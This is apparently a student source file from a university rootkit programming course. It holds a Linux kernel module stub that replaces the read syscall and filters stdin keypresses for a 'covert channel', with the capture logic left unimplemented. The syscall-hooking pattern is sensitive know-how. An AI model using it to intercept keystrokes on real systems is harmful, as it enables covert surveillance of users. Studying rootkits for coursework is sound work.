
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: covert_channel.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>	/* Needed by all kernel modules */
#include "jsmn.h"			/* Needed for ... */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit covert_channel: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define CONF_PATH ".covert_channel.conf"


/* Definition of global variables */
static int show_debug_messages;
asmlinkage long (*cc_original_read_syscall)(unsigned int, char __user *, size_t);   //TODO: should point to original_read


/* Declaration of functions */
int covert_channel_init(int);
int covert_channel_exit(void);

asmlinkage long covert_channel_read_syscall(unsigned int, char __user *, size_t);

static int check_conf_update(void);
static int update_conf(void);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int covert_channel_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	DEBUG_PRINT("initialized");

	return 0;
}


int covert_channel_exit(void)
{
	DEBUG_PRINT("exited");

	return 0;
}


asmlinkage long covert_channel_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;

	/* Call original read_syscall */
	ret = cc_original_read_syscall(fd, buf, count);

	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
	if (fd != 0)
		return ret;

	//TODO: to be implemented

	return ret;
}


static int check_conf_update(void)
{
	return 0;
}


static int update_conf(void)
{
	return 0;
}

